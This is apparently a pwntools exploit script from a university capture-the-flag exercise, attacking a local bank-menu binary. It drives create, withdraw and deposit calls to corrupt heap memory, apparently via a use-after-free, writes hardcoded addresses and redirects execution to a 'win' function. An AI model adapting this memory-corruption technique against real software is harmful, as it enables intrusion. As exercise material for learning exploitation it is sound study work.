from pwn import *

context.binary = './vuln_patched'

addr = 0x403870 



win_addr = context.binary.symbols['win']

context.arch = "amd64"
context.terminal = ['kitty'] 


conn = process('./vuln_patched')
#conn = remote('tasks.ws24.softsec.rub.de', 32795) #process('./vuln_patched')
gdb.attach(conn)




def create(name: bytes) -> None:
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'?\n', name)

def deposit(name: bytes, amount) -> None:
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'into?\n', name)
    conn.sendlineafter(b'nt?\n', str(amount).encode())

def withdraw(name: bytes, amount) -> None:
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'from?\n', name)
    conn.sendlineafter(b'nt?\n', str(amount).encode())

create(b'A'*8)
create(b'B'*8)

withdraw(b'A'*8, '0')
withdraw(b'B'*8, '0')

deposit(b'B'*8, 0x403870)

create(b'T'*8)
print(conn.recvline())

create(b'C'*8)
print(conn.recvline())
deposit(b'C'*8, 0x401810)



print(conn.recvline())
conn.interactive()





